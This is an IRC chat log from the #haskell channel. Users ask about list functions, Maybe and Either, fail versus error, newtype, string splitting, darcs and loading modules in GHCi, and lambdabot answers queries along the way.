08:25:52 <jpcooper> thanks
08:28:04 <jpcooper> @hoogle (a -> Bool) -> [a] -> Bool
08:28:05 <lambdabot> Prelude.any :: (a -> Bool) -> [a] -> Bool
08:28:05 <lambdabot> Prelude.all :: (a -> Bool) -> [a] -> Bool
08:28:05 <lambdabot> Data.List.any :: (a -> Bool) -> [a] -> Bool
08:28:16 <jpcooper> @hoogle Bool -> Bool
08:28:16 <lambdabot> Prelude.not :: Bool -> Bool
08:28:16 <lambdabot> Data.Bool.not :: Bool -> Bool
08:28:16 <lambdabot> Prelude.(&&) :: Bool -> Bool -> Bool
08:38:39 <palmettoboy19> anyone here
08:38:47 <Zao> palmettoboy19: No.
08:39:08 <palmettoboy19> who r u
08:39:22 <Zao> Just another happy haskeller.
08:39:30 <palmettoboy19> wtf is a haskeller
08:39:40 <Zao> And there are lots of people around, mostly springing to life when good questions are asked.
08:40:02 <palmettoboy19> ok well wats a haskeller
08:40:15 <Jaak> someone who uses haskell
08:40:20 <palmettoboy19> wats haskell
08:40:26 <Jaak> /topi
08:40:30 <Jaak> er, /topic
08:40:42 <palmettoboy19> wat?
08:40:43 <mrd> we're all dudes named Haskell
08:41:10 <Jaak> and we all happen to like curry
08:41:14 * Baughn grabs some popcorn. Lookat the troll
08:41:31 <palmettoboy19> so u gotta be smartasses now huh?
08:41:45 <noteventime> And we're functioning fine?
08:42:26 * profmakx thinks the troll should go back to the monad from whence it came!
08:42:45 <noteventime> palmettoboy19: Check the topic
08:43:41 <palmettoboy19> ight well are you all people who know tons of stuff bout computers?
08:43:55 <Lord_Illidan> Is there a O(1) method of getting an element from a list?
08:43:59 <noteventime> palmettoboy19: Not necessarily
08:44:01 <Zao> We know lots about computation.
08:44:04 <Baughn> Lord_Illidan: Sure, head
08:44:13 <Jaak> Lord_Illidan: yes, head?
08:44:25 <Lord_Illidan> err..even if the element is in the middle?
08:44:30 <Jaak> but element at arbitrary position, no
08:44:30 <palmettoboy19> ok well im not as experienced
08:44:33 <Baughn> Lord_Illidan: Then you don't want a list
08:44:36 <noteventime> Lord_Illidan: Not an arbitrary element
08:44:36 <astrolabe> Lord_Illidan: You might try an array
08:44:36 <Lord_Illidan> an array, sry
08:44:48 <noteventime> isn't !! O(1)?
08:44:49 <astrolabe> @type (!)
08:44:50 <lambdabot> forall i e. (Ix i) => Array i e -> i -> e
08:44:53 <Baughn> Lord_Illidan: The standard array access function is O(1)
08:45:09 <Lord_Illidan> Baughn, ah ok
08:45:13 <Baughn> Lord_Illidan: Of course, the update function isn't. Data.Map is usually a good default until you know what the performance issues are.
08:45:34 <palmettoboy19> how do i get private chat?
08:45:47 <noteventime>  palmettoboy19 /msg NICK message
08:45:56 <palmettoboy19> huh?
08:46:07 <Baughn> Leave it alone
08:46:36 <Lord_Illidan> i see
08:46:46 <palmettoboy19> wats /msg
08:46:51 <Lord_Illidan> thanks Baughn
08:47:35 <noteventime> palmettoboy19: If you need help with IRC, join #freenode
08:48:29 <EvilTerran> palmettoboy19, also, for help with Opera in particular, try #opera on irc.opera.com
08:48:29 <palmettoboy19> where do you go to join
08:48:54 <astrolabe> palmettoboy19: type '/join #freenode'.
08:48:55 <noteventime> palmettoboy19: just type /join #irc
08:49:08 <noteventime> #irc leads to #freenode
08:49:37 <palmettoboy19> type it where
08:49:48 <EvilTerran> in the box you type in to say things
08:49:51 <noteventime> palmettoboy19: Same place you type when you send a message
08:50:12 <noteventime> I'm the slower typer, it seems :P
08:50:25 <palmettoboy19> ooo ok thanks
08:50:25 <EvilTerran> i spend *way* too much time in front of a computer; that's not surprising
08:50:41 <noteventime> palmettoboy19: no problem
08:50:49 <palmettoboy19> whats the ChanServ thing that keeps coming up?
08:51:07 <noteventime> palmettoboy19: Questions about IRC and freenode are better asked in #freenode
08:51:24 <palmettoboy19> #freenode
08:51:28 <noteventime> palmettoboy19: This channel is for the functional programming language Haskell
08:51:44 <noteventime> palmettoboy19: You need to put a /join in front of it
08:52:30 <palmettoboy19> join/ #freenode
08:52:54 <astrolabe> I heard you all laughing
08:53:44 <Baughn> palmettoboy19: How did you end up here in the first place?
08:53:59 <palmettoboy19> just looked for a random chat room
08:54:11 <palmettoboy19> you guys are all on opera right?
08:54:13 <Baughn> ..this is one chat room where we don't accept randomness
08:54:30 <noteventime> At least not outside a Monad
08:54:35 <Baughn> palmettoboy19: No. Opera is an IRC /client/; there are many like it, most better.
08:54:56 <Baughn> palmettoboy19: We're all on irc, but you're probably the only one using opera to do it
08:55:04 <palmettoboy19> oh
08:58:47 <palmettoboy19> wat kind of computers do you guys have?
08:59:21 <astrolabe> palmettoboy19: The conversation in here should be about haskell.  If people are repeatedly off-topic, they get booted.
08:59:57 <Baughn> palmettoboy19: There are plenty of channels with topics you might actually be interested in. I doubt this is one.
09:00:39 <foobr> hi guys how do i group a list by 2s? ie [1,2,3,4,5,6] -> [[1,2],[3,4] ...
09:01:05 <foobr> im coding something like this.... group2s xs =  ys : group2s zs where (ys,zs) = (take 2 xs, drop 2 xs)
09:01:15 <foobr> but it gives me an infinite empy list
09:01:17 <EvilTerran> > iterate (drop 2) [1..10]
09:01:18 <lambdabot>  [[1,2,3,4,5,6,7,8,9,10],[3,4,5,6,7,8,9,10],[5,6,7,8,9,10],[7,8,9,10],[9,10],...
09:01:36 <EvilTerran> > takeWhile (not.null) . iterate (drop 2) $ [1..10]
09:01:37 <lambdabot>  [[1,2,3,4,5,6,7,8,9,10],[3,4,5,6,7,8,9,10],[5,6,7,8,9,10],[7,8,9,10],[9,10]]
09:01:45 <EvilTerran> > map (take 2) . takeWhile (not.null) . iterate (drop 2) $ [1..10]
09:01:45 <lambdabot>  [[1,2],[3,4],[5,6],[7,8],[9,10]]
09:01:55 <foobr> whoa
09:01:58 <foobr> coolness
09:02:11 <foobr> thanks EvilTerran
09:02:11 <EvilTerran> > let group2s [] = []; group2s xs =  ys : group2s zs where (ys,zs) = (take 2 xs, drop 2 xs) in group2s [1..10]
09:02:12 <lambdabot>  [[1,2],[3,4],[5,6],[7,8],[9,10]]
09:02:22 <EvilTerran> :)
09:02:42 <noteventime> I hope palmettoboy19 was the IRC equivalent of a prank call
09:02:50 <EvilTerran> foobr, the only thing wrong with yours was lack of a base case
09:03:24 <foobr> i see, the compiler errors scared me when i placed a type
09:03:32 <EvilTerran> in general, if you have a recursive function over a list that makes the list smaller each time, you'll almost certainly want a base case "foo [] = ..."
09:03:57 <foobr> ic, i still got a lot to learn =)
09:03:59 <EvilTerran> or, in some cases, something like "foo [x] = ..." as the base case. but only if your function doesn't make sense when applied to the empty list
09:04:07 <EvilTerran> ?go structural-recursion
09:04:07 <lambdabot> http://en.wikipedia.org/wiki/Structural_induction
09:04:30 <foobr> will check this out
09:04:38 <foobr> thanks again =)
09:05:16 <EvilTerran> :)
09:05:25 <banbh> what's the best way to view an external darcs repo?  (in this case dons' bytestring repo)
09:05:50 <EvilTerran> hm... does anyone else read uses of ?go as sth like "go structural induction! woo!"
09:06:07 <banbh> by browse I mean the history
09:06:15 <EvilTerran> ?where bytestring
09:06:16 <lambdabot> http://www.cse.unsw.edu.au/~dons/fps.html
09:06:58 <wli> > let groupNs _ [] = [] ; groupNs n xs@(_:_) = let (ys, zs) = splitAt n xs in ys : groupNs n zs in groupNs 3 [1..10]
09:06:59 <lambdabot>  [[1,2,3],[4,5,6],[7,8,9],[10]]
09:07:01 <EvilTerran> banbh, i think it might be easiest to darcs get it and browse it locally
09:07:56 <banbh> EvilTerran, thanks; using "darcs changes", or is there an easier way?
09:08:26 <EvilTerran> i dunno, tbh. i haven't really played with darcs more than getting someone else's repo, making a couple of tweaks, and building it
09:09:42 <EvilTerran> groupNs n [] = []; groupNs n (splitAt n -> (these, after)) = these : groupNs n after -- i want views already =/
09:11:28 <smg> in general: do i use data or newtype?
09:11:36 * EvilTerran is tempted to write some meandering blog post about how frustrating he finds having to use single-shot variables for anything and how a language should strive to wholly eliminate the need for them
09:11:44 <EvilTerran> smg, in general, data
09:12:04 <EvilTerran> newtype performs better, but is more restricted
09:12:11 <smg> okay
09:12:13 <EvilTerran> also has different semantics around _|_
09:12:19 <smg> yeah i read about that
09:12:29 <smg> so newtype has less overhead + different behaviour on _|_
09:12:34 <Heffalump> you can read the history of a darcs repo in _darcs/inventory and _darcs/inventories over http.
09:12:40 <smg> and data has extra level of indirection and also differnet behaviour on _|_
09:12:43 <EvilTerran> also newtype has -XNewtypeDeriving on GHC
09:12:53 <smg> EvilTerran: what's that?
09:13:00 <EvilTerran> ?go newtypederiving
09:13:02 <lambdabot> http://hackage.haskell.org/trac/haskell-prime/wiki/NewtypeDeriving
09:13:02 <lambdabot> Title: NewtypeDeriving - Haskell Prime - Trac
09:13:17 <EvilTerran> hm... that was meant to be ?where, but i guess that works
09:13:30 <idnar> heh
09:13:32 <smg> The deriving clause on a newtype can list any class.
09:13:36 <smg> so it's not possible in data?
09:13:57 <Heffalump> no, because the deriver would have to know how to deal with choice and multiple parameters then
09:14:00 <EvilTerran> indeed not. and not on newtype without an extension
09:14:08 <smg> k
09:14:28 <EvilTerran> deriving(...) is still allowed with the usual classes on both
09:16:10 <banbh> Heffalump: thanks
09:17:33 <Heffalump> extensions: ForeignFunctionInterface, TypeSynonymInstances, PolymorphicComponents, DeriveDataTypeable, CPP
09:17:50 <Heffalump> can anyone tell me what's wrong with that field in a cabal file running with GHC 6.8.1?
09:18:03 <Heffalump> it's indented a bit under a section called Library if that helps.
09:21:09 <BMeph> ?go hoogle something
09:21:10 <lambdabot> http://www.haskell.org/haskellwiki/Hoogle
09:21:10 <lambdabot> Title: Hoogle - HaskellWiki
09:21:27 <BMeph> ?hoogle something
09:21:27 <lambdabot> Data.Generics.Schemes.something :: GenericQ (Maybe u) -> GenericQ (Maybe u)
09:21:46 <BMeph> Morning, all. :)
09:21:55 <SamB> ?ho ho ho
09:21:55 <lambdabot> Maybe you meant: hoogle hoogle+ . ? @ bf echo ft ghc id pl rc show thx v wn yow
09:22:01 <SamB> um...
09:22:02 <EvilTerran> ?where nondet
09:22:02 <lambdabot> I know nothing about nondet.
09:22:08 <EvilTerran> ?go nondet monad
09:22:09 <lambdabot> http://pauillac.inria.fr/~xleroy/mpri/progfunc/monads.ml
09:22:13 <SamB> hmm.
09:23:13 <smg> @uptime
09:23:13 <lambdabot> uptime: 18h 49m 53s, longest uptime: 1m 10d 23h 44m 29s
09:23:30 <smg> @date
09:23:30 <lambdabot> Maybe you meant: dice paste vote
09:23:34 * SamB wonders if it is really desirable for lambdabot to give suggestions in this situation
09:23:45 <smg> SamB: why?
09:24:09 <SamB> smg: well, just because ho is a prefix of hoogle is a prefix of hoogle+ ?
09:24:28 <eyeris> Maybe seems a bit useless itrw because there's no indication of what went wrong. When the docs say "operations that can fail" it seems to imply "operations for which failure is not fatal" because all fatal errors should have a unique message for the user. Is there anything in the Haskell libraries that works like Maybe, but carries an error message? Do people just return (Maybe a, String)?
09:24:45 <EvilTerran> eyeris, Either
09:24:58 <eyeris> EvilTerran Thanks
09:25:02 <allbery_b> the simplest MonadError is Either String
09:25:20 <EvilTerran> > do { fail "oh no it went wrong" } :: Either String Int
09:25:22 <lambdabot>        add an instance declaration for (Monad (Either String))
09:25:22 <lambdabot>     In the exp...
09:25:33 <EvilTerran> er?
09:25:42 <SamB> doesn't have the instance imported, I guess
09:25:47 <smg> fail and error
09:25:56 <EvilTerran> lambdabot: ITYM (Left "on no it went wrong")
09:26:09 <SamB> but it went wronger
09:26:13 <EvilTerran> indeed :P
09:26:18 <allbery_b> > do { Control.Monad.Error.fail "oh no it went wrong" } :: Either String Int
09:26:19 <lambdabot>   Not in scope: `Control.Monad.Error.fail'
09:26:19 <smg> so hwat we do use? fail or error? :) sounds quite the same
09:26:21 <allbery_b> feh
09:26:27 <SamB> smg: not at all!
09:26:35 <EvilTerran> smg, (error x = _|_)
09:26:38 <allbery_b> error does an exception, so wrong
09:26:47 <allbery_b> fail is canonical because you can switch the monad
09:26:54 <SamB> :t ErrorT
09:26:56 <lambdabot> Not in scope: data constructor `ErrorT'
09:27:00 <SamB> hmm.
09:27:07 <EvilTerran> smg, but (fail x = _|_) only in monads that lack a better definition of fail
09:27:07 <allbery_b> otherwise see Control.Monad.Error
09:27:08 <smg> EvilTerran: k and fail?
09:27:10 <smg> ah
09:27:20 <EvilTerran> > fail "oops" :: Maybe Int
09:27:21 <lambdabot>  Nothing
09:27:22 <smg> uh, but it looks the same?
09:27:25 <EvilTerran> > fail "oops" :: Either String Int
09:27:26 <lambdabot>        add an instance declaration for (Monad (Either String))
09:27:26 <lambdabot>     In the exp...
09:27:33 <EvilTerran> > fail "oops" :: [Int]
09:27:33 <lambdabot>  []
09:27:34 <allbery_b> hm
09:27:43 <eyeris> smg, everything seems to look the same in Haskell :)
09:27:46 <EvilTerran> ?type fail
09:27:48 <lambdabot> forall (m :: * -> *) a. (Monad m) => String -> m a
09:27:50 <EvilTerran> ?type error
09:27:51 <lambdabot> forall a. [Char] -> a
09:27:57 <smg> eyeris: mh
09:28:24 <smg> EvilTerran: looks better now
09:28:24 <EvilTerran> that "Monad m" constraint means the value of "fail ..." can actually be meaningful
09:28:49 <EvilTerran> while (error x :: forall a. a) so its value is utterly devoid of meaning
09:29:21 <EvilTerran> as it returns a value that is in every type, and the only such value is _|_
09:29:26 <eyeris> What is a good rl program that is good to learn from? Yi?
09:29:45 <EvilTerran> eyeris, xmonad's good, as you can tinker with it and see the results
09:31:00 <SamB> that sounds a bit dangerous to me
09:31:33 <eyeris> SamB: not if I run it in an embedded X server
09:31:53 <allbery_b> xephyr, Xnest, vnc... lots of ways
09:31:55 <eyeris> where I only run useless programs
09:31:59 <SamB> true enough. I wonder if it works that way out of the box yet?
09:32:18 <SamB> so people still use Xnest?
09:32:37 <allbery_b> only as a last resort as it's painful.  xephyr is the nice version
09:32:40 <eyeris> SamB: yeah. I know some people who use it for KDE dev/testing
09:32:50 <allbery_b> (but Xnest is aval;able almost everywhere)
09:33:44 <SamB> allbery_b: Xephyr isn't?
09:34:41 <allbery_b> usually not in a default install
09:34:58 <SamB> and Xnest is?
09:34:59 <allbery_b> Xnest has a higher chance of having been installed with X11
09:35:23 <allbery_b> (and gnome's fast-switch-user stuff uses Xnest, I think)
09:35:25 <eyeris> SamB: Believe it or not, some people still use XFree86 4.3.0 or whatever the latest version of it is
09:35:36 <SamB> eyeris: so?
09:35:40 <eyeris> e.g. I think Debian/stable just recently updated to Xorg
09:35:52 <SamB> define "just recently"
09:35:58 <eyeris> SamB doesn't Xephyr require Xorg?
09:36:11 <SamB> it is in the Xorg repository...
09:36:46 <SamB> but I am under the impression that, once built, it has little to do with Xorg besides the contained code...
09:37:00 <SamB> actually wait.
09:37:18 <SamB> did they migrate all that stuff to git? if so, I have no idea what repository it is in...
09:37:36 <eyeris> Debian/stable last major release was August 16th, 2007
09:37:40 <eyeris> so maybe not that recent
09:37:55 <SamB> anyway, debian stable is never up to date
09:38:00 <SamB> that's why it is called stable
09:38:22 <eyeris> But a surprising number of people run it
09:39:21 <eyeris> anyway, I have to get some real work done today
09:39:23 <eyeris> ttyl
09:47:01 <smg> is there a function to split a line of userinput, say "a;b;c;d;e" into a list with a,b,c,d,e ?
09:48:54 <paolino> smg, it called exercise
09:49:43 <u_quark> does anyone know of any layout engine in haskell ?
09:50:08 <paolino> smg, it's doable with unfold
09:50:33 <Saizan> smg: there's lines or words, but for a general separator you've to write it yourself with break or span
09:53:25 <paolino> u_quark: pretty print ?
09:53:55 <u_quark> nop... maybe generic like swing maybe...
09:54:18 <u_quark> or graph layout visualization engines
09:55:39 <twanvl> I just call graphviz, that works pretty well.
09:56:54 <u_quark> yea graphviz is pretty neat but I need a library h haskell...
09:57:35 <twanvl> what do you want to do with the result?
09:59:00 <twanvl> There is also Data.Graph.Inductive.Graphviz if you want a library to do the calling for you.
09:59:41 <u_quark> i want a lib that i can modify ...
09:59:52 <u_quark> or extend ...
10:00:00 <twanvl> you want to mess with layout algorithms?
10:00:12 <u_quark> something like that...
10:00:59 <twanvl> I don't know any haskell implementations of this sort of thing, sorry
10:01:36 <u_quark> ok...
10:02:35 <smg> paolino, Saizan i see thx
10:04:45 <sw17ch> @src sequence
10:04:45 <lambdabot> sequence []     = return []
10:04:45 <lambdabot> sequence (x:xs) = do v <- x; vs <- sequence xs; return (v:vs)
10:04:45 <lambdabot> --OR
10:04:45 <lambdabot> sequence xs = foldr (liftM2 (:)) (return []) xs
10:04:55 <gnuvince_> @src seq
10:04:55 <lambdabot> Source not found. Just what do you think you're doing Dave?
10:06:59 <smg> Saizan: i need break or span?
10:09:14 <paolino> :t span
10:09:18 <lambdabot> forall a. (a -> Bool) -> [a] -> ([a], [a])
10:09:37 <paolino> :t break
10:09:38 <lambdabot> forall a. (a -> Bool) -> [a] -> ([a], [a])
10:09:47 <smg> i looked that up
10:09:56 <sw17ch> > break (=10) [1..20]
10:09:56 <lambdabot>  Parse error at "=10)" (column 8)
10:10:01 <sw17ch> > break (==10) [1..20]
10:10:03 <lambdabot>  ([1,2,3,4,5,6,7,8,9],[10,11,12,13,14,15,16,17,18,19,20])
10:10:10 <sw17ch> > span (==10) [1..20]
10:10:10 <lambdabot>  ([],[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20])
10:10:17 <twanvl> smg: See http://www.haskell.org/pipermail/libraries/2008-January/008922.html
10:10:18 <lambdabot> Title: Proposal: Add split and splitWith (trac #2048), http://tinyurl.com/2mbys7
10:11:05 <paolino> > span (==10) [10,1]
10:11:06 <lambdabot>  ([10],[1])
10:11:24 <paolino> @src span
10:11:24 <lambdabot> Source not found. I am sorry.
10:11:27 <smg> twanvl: that's erroneous
10:11:48 <twanvl> why?
10:14:12 <hpaste>  (anonymous) pasted "split" at http://hpaste.org/6030
10:14:18 <smg> http://hpaste.org/6030
10:14:24 <sw17ch> @src flip
10:14:25 <lambdabot> flip f x y = f y x
10:14:28 <sw17ch> hehehe
10:15:35 <paolino>  break p                 =  span (not . p)
10:16:19 <paolino> > span (/=10) [1..20]
10:16:20 <lambdabot>  ([1,2,3,4,5,6,7,8,9],[10,11,12,13,14,15,16,17,18,19,20])
10:18:36 <smg> you think that is okay?
10:19:46 <twanvl> at first glance it looks like it should work, but the head/tail is a bit ugly
10:20:27 <smg> hehe okay
10:20:32 <smg> for the moment it's just fine
10:21:34 <jfincher> is Haskell call-by-need or call-by-name?
10:23:20 <twanvl> Haskell-the-language is call-by-name, call-by-need is a possible implementation of call-by-name.
10:25:06 <smg> erm
10:25:19 <smg> can i somehow check if a variable is defined or not?
10:25:31 <Cale> I really dislike those names for evaluation strategies.
10:25:37 <Cale> (call-by-X)
10:25:48 <twanvl> smg: check in what way? in your program? in the interpreter?
10:25:52 <Cale> I always get them confused, it's entirely unclear to me how they reflect what they mean.
10:25:57 <smg> okay i asked the wrong question
10:25:57 <twanvl> Cale: I agree
10:26:07 <smg> i want to make a parameter "optional"
10:26:19 <smg> like say, if parameter x isn't set i want to use a default value
10:26:22 <smg> is that possible?
10:26:33 <twanvl> no
10:26:49 <smg> oh
10:26:52 <twanvl> It is usually the easiest to make another function which fills in the default value
10:26:59 <smg> ok
10:28:06 <Cale> You can use the Maybe type
10:28:28 <Cale> So you either explicitly supply Nothing, or Just x, depending on whether you want that parameter to be "set".
10:28:42 <smg> ah
10:28:44 <smg> you mean instead of Char i use Maybe
10:28:49 <Cale> Maybe Char
10:28:52 <twanvl> You could also make a special "defaultParamX" value
10:29:42 <smg> ah
10:31:24 <sw17ch> can a function " f a = do { ... a ... } ever have a type that doesn't have IO stapled on the front of it?
10:31:38 <yrlnry> No.
10:31:52 <Zao> What about other monads?
10:32:00 <Zao> Or is do IO-specific?
10:32:09 <twanvl> sw17ch: do {..} is not just for IO, but if you use any IO function inside it f will have an IO ... type
10:32:11 <hpaste>  (anonymous) pasted "(no title)" at http://hpaste.org/6032
10:32:16 <smg> http://hpaste.org/6032
10:32:19 <smg> maybe someone can look at the paste?
10:32:56 <sw17ch> twanvl: alright, i thought so... i'm still figuring out how to get things to play nice... types are occasionally hard
10:33:45 <sebell> Hmm.. surely several implementations of a general split are documented in the Wiki?
10:33:57 <smg> Cale: you mabye?
10:34:04 <smg> would be ice
10:34:14 <smg> sebell: nvm, i want to write my own
10:34:58 <sebell> smg: Sure, and once you're done you can see some other implementations and learn about how it might be done differently :)
10:35:31 <smg> suggestion to the paste?
10:35:38 <Cale> smg: I'll look
10:35:42 <smg> ah i forgot the error message
10:35:52 <Cale> um
10:36:03 <hpaste>  (anonymous) pasted "(no title)" at http://hpaste.org/6033
10:36:09 <smg> 6033 is the error message
10:36:14 <Cale> I can see one immediate problem
10:36:23 <Cale> Right, that one.
10:36:43 <Cale> You can't use Maybe values as booleans (though it might be nice)
10:36:50 <smg> hehe ok
10:36:51 <Cale> You have to pattern match using case
10:37:02 <smg> case delim of ?
10:37:02 <Cale> case mydelim of
10:37:06 <Cale>    Nothing -> ...
10:37:10 <Cale>    Just v -> ...
10:37:50 <Cale> Of course, if you'd care to pattern match it out on the left hand sides of the equations, you can do that too
10:38:16 <Cale> For this, it really feels like it would be more convenient just to have two functions, one with, and one without the parameter.
10:38:36 <Cale> actually, I'm not entirely sure why you'd ever supply Nothing there...
10:38:46 <Cale> But I'm not sure what the spec of your program is.
10:39:39 <EvilTerran> you can also use functions such as "maybe" to get rid of Maybes
10:39:43 <EvilTerran> ?src maybe
10:39:43 <lambdabot> maybe n _ Nothing  = n
10:39:44 <lambdabot> maybe _ f (Just x) = f x
10:40:21 <swiert> @seen mattam
10:40:22 <lambdabot> mattam is in #haskell and ##logic. I don't know when mattam last spoke.
10:40:58 <hpaste>  (anonymous) pasted "(no title)" at http://hpaste.org/6034
10:41:04 <smg> another paste :\
10:42:10 <jleedev> :t isMaybe
10:42:11 <lambdabot> Not in scope: `isMaybe'
10:42:15 <jleedev> :t isNothing --oops
10:42:17 <lambdabot> forall a. Maybe a -> Bool
10:42:22 <EvilTerran> smg, a nicer way of dealing with that Maybe would be to add a line to the top of the pattern-match, something like "mysplit xs Nothing = mysplit xs (Just ' ')"
10:42:42 <smg> ah
10:42:43 <EvilTerran> and then having "mysplit (char:chars) (Just delim) ..."
10:42:54 <smg> i see
10:43:08 <EvilTerran> that should fix your last type error, too
10:43:11 <EvilTerran> altho there may be more
10:43:39 <smg> i don't find the error in the paste do you?
10:44:04 <paolino> you call mysplit wrongly in the end
10:44:17 <paolino> it wants a Maybe
10:44:47 <paolino> call it with delim
10:45:10 <mattam> swiert: hi
10:45:19 <swiert> mattam: hiya.
10:45:27 <swiert> mattam: fixed your Coq installation?
10:45:53 <smg> mh k
10:45:57 <mattam> Not yet, I just got back Ring_polynom.v, that was the hardest part I think.
10:46:22 <smg> mysplit "foobar" 'b'
10:46:25 <swiert> mattam: what have you been doing to it?
10:46:26 <smg> leads to error msg:
10:46:28 <smg> <interactive>:1:17:
10:46:28 <smg>     Couldn't match expected type `Maybe Char'
10:46:28 <smg> 	   against inferred type `Char'
10:46:32 <mattam> I'm debugging my new setoid-rewriting tactic based on type classes, this is great :)
10:46:36 <paolino> Just 'b'
10:47:08 <swiert> mattam: cool.
10:47:11 <sw17ch> my program used to be pretty and felt kinda elegant, but as soon as i try and make it use file handles... everything gets gross
10:47:20 <smg> thanks
10:47:22 <oerjan> smg: have you pasted anywhere?
10:47:22 <smg> now it's cool
10:47:28 <oerjan> oh
10:47:35 <swiert> mattam: did you hear that Ulf implemented the "injectivity test" in Agda?
10:48:27 <mattam> Good... that was fast too :)
10:48:28 <hpaste>  (anonymous) pasted "(no title)" at http://hpaste.org/6036
10:48:37 <oerjan> smg: oh, found it.  but it would be nice if you put a nick on the paste :)
10:48:37 <smg> oerjan: 6036 is mine
10:48:46 <smg> i know it's not good, but it works for my purpose atm :]
10:48:52 <smg> okay sorry next time i will do that
10:48:59 <gnuvince_> :t par
10:49:00 <lambdabot> forall a b. a -> b -> b
10:49:06 <Cale> sw17ch: hmm
10:49:14 <Cale> sw17ch: Rather than lazy IO, you mean?
10:49:28 <swiert> mattam: yep. I'm just building the latest Agda. It should be fun to hack up some type classes :)
10:49:38 <oerjan> smg: annotations are also good, keeps things together
10:50:54 <smg> what is annotation?
10:51:37 <EvilTerran> what happens when you click the "annotate" link on hpaste
10:51:46 <smg> ah annotation is @
10:51:53 <mattam> swiert: Congrats for being cited by Wadler and on LtU BTW !
10:51:55 <smg> EvilTerran: it annotates in this channel
10:52:13 <EvilTerran> i don't think that word means what you think it means
10:52:14 <swiert> mattam: yeah. My 15 minutes of fame.
10:52:16 <smg> ghc --make Util.hs -o Util
10:52:23 <smg> but i can't use my module if i do :m +Util
10:52:27 <paolino> it adds your code in the same page
10:52:31 <oerjan> smg: there are annotate links in each paste.  note that if you want to modify a paste you want to use the small link by the paste itself, rather than the main one for the whole page
10:52:38 <smg> ah okay
10:52:58 <sw17ch> Cale: well... i'm using lazy ByteStrings and hGet, but i'm trying to read at several different places in the file at once... so i have a few file handles
10:53:10 <oerjan> the main one does not quote the original
10:53:11 <Cale> sw17ch: ah, okay
10:53:15 <sw17ch> i get almost there, but after the hGet, i have an IO ByteString rather than a ByteString
10:53:18 <conal> i agree with wadler.  lovely work, swiert!
10:53:24 <sw17ch> and i hate that problem b/c i can never figure out how to make it work
10:53:29 <smg> do you understand me or do i write obfuscated? :]
10:53:35 <swiert> thanks conal!
10:53:51 <smg> i have now file Util.hs and there are methods in it, i want to use that module like the others in ghci with :m +MyUtil
10:53:58 <smg> that is possible is it?
10:54:05 <sebell> sw17ch: What's wrong with an IO ByteString?
10:54:07 <smg> do i need to edit the HASKELLPATH?
10:54:07 * Cale wonders what conal and swiert are referring to :)
10:54:15 <OceanSpray> sw17ch, <- ?
10:54:16 <sw17ch> sebell: i have no idea :)
10:54:32 <Cale> smg: Name the file the same as the module name if you want GHC to find it automatically.
10:54:34 <sw17ch> OceanSpray: i'm trying to do it point free... and for whatever reason, i can make that part work either :)
10:54:39 <conal> Cale: http://lambda-the-ultimate.org/node/2700
10:54:40 <lambdabot> Title: Data Types a la Carte | Lambda the Ultimate
10:54:47 <OceanSpray> >>= ?
10:54:53 <Cale> smg: Otherwise, you have to be explicit about where it gets loaded from.
10:55:03 <sw17ch> sebell: i have a function that works on a ByteString... that's all
10:55:14 <EvilTerran> sw17ch, try liftM?
10:55:24 <paolino> fmap it
10:55:49 <sw17ch> EvilTerran: what exactly does liftM do?
10:55:55 <EvilTerran> ?src liftM
10:55:55 <lambdabot> liftM f m1 = do { x1 <- m1; return (f x1) }
10:56:05 <sebell> sw17ch: Ah. The key here is lazy ByteString, so the `IO' sticks around so it can read more data if necessary
10:56:25 <smg> Cale: i have in ~ a file called Util.hs and in the file i have written module Util where
10:56:26 <sw17ch> mmmm...
10:56:27 <smg> is that right?
10:56:33 <EvilTerran> sebell, that doesn't sound right...
10:56:48 <Cale> conal, swiert: Cool, so this is where that trick comes from :)
10:57:11 <sw17ch> sebell: ah, alright
10:57:12 <paolino> smg yes
10:57:22 <swiert> Cale: well... A lot of credit goes to the original monad transformers paper.
10:57:23 <Cale> (I've seen this technique used in a couple of places, but I haven't seen this paper before.)
10:57:30 <smg> mh ghci won't find it? :|
10:57:35 <twanvl> Isn't :m + only for libraries?
10:57:49 <sebell> EvilTerran: No? I should probably look at the docs, but I was assuming that's what the lazy BS IO operations did
10:57:51 <smg> Prelude> :m +Util
10:57:51 <smg> module main:Util is not loaded
10:57:51 <paolino> smg now import it from the other files
10:58:06 <smg> yeah import is possible
10:58:13 <smg> so twanvl is right? +m is for libraries
10:58:28 <EvilTerran> sebell, the lazy reading ones work the same way as getContents etc, iirc
10:58:36 <EvilTerran> ie, unsafeInterleaveIO
10:58:38 <twanvl> You can also use :l OneModule.hs AnotherModule.hs Etc.hs
10:58:47 <smg> ah
10:58:59 <smg> twanvl: that's good thank you :]
11:09:15 <banbh> Does anyone know what's up with http://darcs.haskell.org/darcsweb ?  It seems to be a couple of months behind http://darcs.haskell.org .  For example compare http://darcs.haskell.org/darcsweb/darcsweb.cgi?r=bytestring;a=filehistory;f=/Data/ByteString/Lazy.hs with http://darcs.haskell.org/bytestring/_darcs/inventory
11:09:16 <lambdabot> Title: darcs - Repositories
11:11:41 <MenTaLguY> hello
11:11:47 <EvilTerran> ?djinn ((a -> e -> e) -> e -> e) -> (a -> (b -> e -> e) -> e -> e) -> (b -> e -> e) -> e -> e
11:11:47 <lambdabot> f a b c d = a (\ e f -> b e c f) d
11:22:53 <EvilTerran> ?list djinn
11:22:53 <lambdabot> djinn provides: djinn djinn-add djinn-del djinn-env djinn-names djinn-clr djinn-ver
11:22:58 <EvilTerran> ?help djinn-add
11:22:58 <lambdabot> djinn-add <expr>.
11:22:59 <lambdabot> Define a new function type or type synonym
11:25:44 <EvilTerran> ?djinn-add data Foldr e a = Foldr ((a -> e -> e) -> e -> e)
11:25:53 <EvilTerran> ?djinn Foldr e a -> (a -> Foldr e b) -> Foldr e b
11:25:53 <lambdabot> f a b =
11:25:53 <lambdabot>     case a of
11:25:53 <lambdabot>     Foldr c -> Foldr (\ d e ->
11:25:53 <lambdabot>                       c (\ f g ->
11:25:53 <lambdabot>                          case b f of
11:25:55 <lambdabot>                          Foldr h -> h d g) e)
11:26:01 <EvilTerran> hm.
11:26:39 <mld> "Possible fix: add (Show a, Read a) to the class or instance method `>>='",, is this possible? i can't seem to figure out how i would do that
11:27:05 <Cale> mld: Basically, that's impossible, since >>= is out of your hands.
11:27:32 <Cale> mld: (It would only be possible if you had control over the Prelude, and even then, you wouldn't likely want to do it.
11:27:54 <Cale> Implementations of bind must avoid using operations which depend on particular typeclasses being present.
